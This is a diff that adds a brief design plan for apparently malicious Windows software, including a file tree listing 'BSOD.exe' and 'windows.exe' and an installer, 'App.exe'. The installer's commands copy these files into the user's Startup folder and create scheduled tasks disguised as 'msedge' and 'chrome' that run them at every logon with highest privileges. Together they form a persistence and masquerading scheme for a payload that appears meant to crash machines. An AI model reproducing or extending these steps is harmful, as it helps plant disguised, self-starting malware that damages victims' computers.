@@ -1,0 +1,35 @@
+File tree:
+/
+│
+│
+├─Content
+│       │
+│       │
+│       ├─s32d.exe
+│       ├─*boot.bin
+│       ├─*main.exe
+│
+│
+├─App.exe
+├─Startup
+        │
+        │
+        ├─BSOD.exe
+        ├─windows.exe
+
+
+Explanation:
+
+/App.exe:
+mkdir C:/Program Files/WinSys
+mkdir C:/Program Files/WinSys/Main
+mkdir C:/Program Files/WinSys/Main/Content
+copy /Startup/BSOD.exe, windows.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+**schtasks /create /tn "msedge" /tr "File path to BSOD.exe" /sc onlogon /rl highest
+**schtasks /create /tn "chrome" /tr "File path to windows.exe" /sc onlogon /rl highest
+
+
+
+Rewrite of original documentation plan
+* - Remove
+** - Add
